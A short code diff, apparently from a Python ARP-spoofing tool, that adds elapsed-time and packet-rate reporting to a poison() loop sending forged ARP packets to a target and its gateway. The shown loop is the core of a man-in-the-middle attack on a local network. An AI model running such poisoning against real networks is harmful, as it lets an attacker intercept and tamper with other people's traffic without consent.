@@ -164,14 +164,22 @@ def poison(target_ip, gateway_ip, iface="eth0", interval=2):
     pkt_to_gateway = build_arp_packet(our_mac, target_ip, gateway_mac, gateway_ip)
 
     count = 0
+    start_time = time.time()
     print("poisoning... (ctrl+c to stop)")
     while running:
         sock.send(pkt_to_target)
         sock.send(pkt_to_gateway)
         count += 1
         if count % 10 == 0:
-            print(f"  sent {count * 2} packets", end="\r")
+            elapsed = time.time() - start_time
+            rate = (count * 2) / elapsed if elapsed > 0 else 0
+            print(f"  packets: {count * 2}  "
+                  f"elapsed: {elapsed:.0f}s  "
+                  f"rate: {rate:.1f} pkt/s", end="\r")
         time.sleep(interval)
+
+    elapsed = time.time() - start_time
+    print(f"\ntotal: {count * 2} packets in {elapsed:.1f}s")
 
 
 def main():
